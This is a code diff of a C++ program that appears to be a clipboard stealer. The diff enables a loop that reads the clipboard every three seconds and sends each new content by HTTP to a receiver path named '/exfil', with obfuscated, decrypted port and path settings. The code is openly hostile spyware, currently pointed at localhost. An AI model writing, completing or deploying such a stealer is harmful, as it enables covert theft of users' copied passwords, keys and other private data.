@@ -11,24 +11,22 @@
 #include <fcntl.h>
 #include <io.h>
 
-void HandleNewData(std::wstring& data)
-{
-    std::string utf8_data = WStringToUtf8(data);
-    
-    std::wcout << L"[*] New Clipboard Content:\n\n" << data << L"\n\n";
-    std::wcout << L"Sending data to receiver...\n";
+void HandleNewData(std::string& data)
+{    
+    std::cout << "[*] New Clipboard Content:\n\n" << data << "\n\n";
+    std::cout << "Sending data to receiver...\n";
 
     try
     {
-        ExfiltrateClipboardHTTP(utf8_data, "127.0.0.1", "/exfil", 80);
+        ExfiltrateClipboardHTTP(data, "127.0.0.1", "/exfil", 80);
     }
     catch(const std::exception& ex)
     {
-        std::wcout << L"Error when sending data to receiver: " << ex.what() << "\n";
+        std::wcout << "Error when sending data to receiver: " << ex.what() << "\n";
     }
     catch(...)
     {
-        std::wcout << L"Unknown exception occured when sending data to receiver.\n";
+        std::wcout << "Unknown exception occured when sending data to receiver.\n";
     }
 }
 
@@ -42,18 +40,18 @@ int main() {
     std::cout << "\nDECRYPTED_PORT: " + port << " (" << port.length() << ")\n";
     std::cout << "\nDECRYPTED_PATH: " + path << " (" << path.length() << ")\n";
 
-    // while(true)
-    // {
-    //     std::wstring currentClipboard = GetClipboardText();
+    while(true)
+    {
+        std::string currentClipboard = GetClipboardText();
 
-    //     if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
-    //     {
-    //         HandleNewData(currentClipboard);  
-    //         lastClipboard = currentClipboard;
-    //     }
+        if(!currentClipboard.empty() && currentClipboard != lastClipboard) 
+        {
+            HandleNewData(currentClipboard);  
+            lastClipboard = currentClipboard;
+        }
 
-    //     std::this_thread::sleep_for(std::chrono::seconds(3));
-    // }
+        std::this_thread::sleep_for(std::chrono::seconds(3));
+    }
 
     return 0;
 }
